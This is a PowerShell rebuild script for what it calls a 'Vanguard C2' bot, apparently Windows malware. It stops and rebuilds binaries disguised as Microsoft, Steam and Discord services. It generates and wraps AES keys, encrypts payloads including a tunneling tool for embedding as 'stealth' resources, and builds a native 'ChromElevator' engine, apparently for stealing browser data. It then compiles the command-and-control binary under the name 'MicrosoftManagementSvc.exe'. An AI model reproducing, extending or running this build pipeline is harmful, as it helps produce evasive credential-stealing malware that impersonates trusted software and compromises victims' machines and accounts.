# Vanguard C2: Sentinel Full Rebuild Script
# Optimized for high-resilience persistence and NativeAOT compilation

$BaseDir = Get-Location
$ConstantsPath = Join-Path $BaseDir "defense\Constants.cs"
$CsprojPath = Join-Path $BaseDir "FinalBot.csproj"

# Ensure directories exist
if (!(Test-Path "dist")) { $null = New-Item -ItemType Directory -Path "dist" }
if (!(Test-Path "tools")) { $null = New-Item -ItemType Directory -Path "tools" }

Write-Host "[*] Phase 1: Cleaning up old processes..." -ForegroundColor Cyan
Get-Process "MicrosoftManagementSvc" -ErrorAction SilentlyContinue | Stop-Process -Force
Get-Process "SteamLogin" -ErrorAction SilentlyContinue | Stop-Process -Force
Get-Process "MsDiscordSvc" -ErrorAction SilentlyContinue | Stop-Process -Force

Write-Host "[*] Phase 2: Compiling Python modules to EXE (PyInstaller)..." -ForegroundColor Cyan
# [SKIP] PyInstaller build skipped for dev; using existing dist binaries if present.

Write-Host "[*] Phase 3: Synchronizing Encryption Salts..." -ForegroundColor Cyan
$rng = New-Object System.Security.Cryptography.RNGCryptoServiceProvider
$bytes = New-Object byte[] 32
$rng.GetBytes($bytes)
$MasterKeyB64 = [Convert]::ToBase64String($bytes)
$bytes = New-Object byte[] 32
$rng.GetBytes($bytes)
$SessionKeyB64 = [Convert]::ToBase64String($bytes)

# [V6.2 HARDENING] Wrap the Session Key using the Master Key via Python cryptoservice
$WrappedKeyB64 = (python scripts\encrypt_gcm.py wrap $SessionKeyB64 $MasterKeyB64).Trim()

if (Test-Path $ConstantsPath) {
    $Content = Get-Content $ConstantsPath -Raw
    $Content = [regex]::Replace($Content, 'public const string MASTER_KEY_B64 = ".*?";', "public const string MASTER_KEY_B64 = `"$MasterKeyB64`";")
    $Content = [regex]::Replace($Content, 'public const string ENCRYPTED_SESSION_KEY_B64 = ".*?";', "public const string ENCRYPTED_SESSION_KEY_B64 = `"$WrappedKeyB64`";")
    Set-Content $ConstantsPath $Content
    Write-Host "    [+] Synced Master & Encrypted Session Key." -ForegroundColor Green
}

# 4. Encryption Loop
$FilesToEncrypt = @("dist\SteamLogin.exe", "dist\MsDiscordSvc.exe", "dist\SteamAlert.exe", "tools\bore.exe")
foreach ($file in $FilesToEncrypt) {
    if (Test-Path $file) {
        $binFile = $file -replace "\.exe", ".bin"
        Copy-Item -Path $file -Destination $binFile -Force
        python scripts\encrypt_gcm.py encrypt $binFile $SessionKeyB64
        Write-Host "    [+] AES-GCM Encrypted $(Split-Path $file -Leaf)" -ForegroundColor Green
        
        # [PRO STEALTH] Copy encrypted .bin to root for csproj EmbeddedResource inclusion
        $rootBin = Join-Path $BaseDir (Split-Path $binFile -Leaf)
        Copy-Item -Path $binFile -Destination $rootBin -Force
    } else {
        Write-Host "    [!] Warning: $file not found, skipping encryption." -ForegroundColor Yellow
    }
}

Write-Host "[*] Phase 4: Building C# C2 (NativeAOT)..." -ForegroundColor Cyan

# V6.18: Build the Native ChromElevator Engine first (Statically Linked)
if (Test-Path "tools\chromelevator\make.bat") {
    Write-Host "    [>] Building Native ChromeEngine (Static Lib)..." -ForegroundColor Gray
    Push-Location "tools\chromelevator"
    cmd.exe /c "make.bat build_lib"
    Pop-Location
}

dotnet publish $CsprojPath -c Release -r win-x64 -p:PublishAot=true --nologo

if ($LASTEXITCODE -eq 0) {
    $PublishDir = ".\bin\Release\net8.0-windows\win-x64\publish\"
    $FinalExe = Join-Path $PublishDir "MicrosoftManagementSvc.exe"
    
    if (Test-Path "GlobalLogger.py") {
        Copy-Item -Path "GlobalLogger.py" -Destination $PublishDir -Force
    }

    # [PRO STEALTH] bore.bin is now EMBEDDED, no need to copy to publish folder.

    Write-Host "`n[SUCCESS] Full rebuild complete!" -ForegroundColor Green
    Write-Host "[+] Binary location: $FinalExe" -ForegroundColor Green
} else {
    Write-Error "C# Build FAILED!"
}
